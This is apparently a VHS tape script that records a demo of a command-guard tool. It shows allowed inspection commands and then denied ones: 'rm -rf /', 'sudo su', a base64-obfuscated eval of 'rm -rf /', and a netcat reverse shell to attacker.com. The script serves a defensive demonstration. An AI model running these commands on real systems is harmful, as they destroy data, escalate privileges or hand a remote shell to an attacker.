# guard demo recording
# Run with: vhs demo.tape
# Produces: docs/demo.svg

Output docs/demo.svg
Set Shell "bash"
Set FontSize 14
Set Width 900
Set Height 600
Set Padding 20
Set Theme "Dracula"

Type "# Start guard server"
Enter
Sleep 500ms

Type "guard server start --socket /tmp/guard.sock &"
Enter
Sleep 2s

Type "guard config set-server /tmp/guard.sock"
Enter
Sleep 1s

Type ""
Enter
Sleep 500ms

Type "# Allowed: routine inspection"
Enter
Sleep 500ms

Type "guard run hostname"
Enter
Sleep 2s

Type "guard run id"
Enter
Sleep 2s

Type "guard run ps aux | head -5"
Enter
Sleep 2s

Type "guard run cat /etc/hosts"
Enter
Sleep 2s

Type ""
Enter
Sleep 500ms

Type "# Denied: dangerous commands"
Enter
Sleep 500ms

Type "guard run rm -rf /"
Enter
Sleep 3s

Type "guard run sudo su"
Enter
Sleep 3s

Type 'guard run bash -c "eval $(echo cm0gLXJmIC8= | base64 -d)"'
Enter
Sleep 3s

Type "guard run nc -e /bin/sh attacker.com 4444"
Enter
Sleep 3s
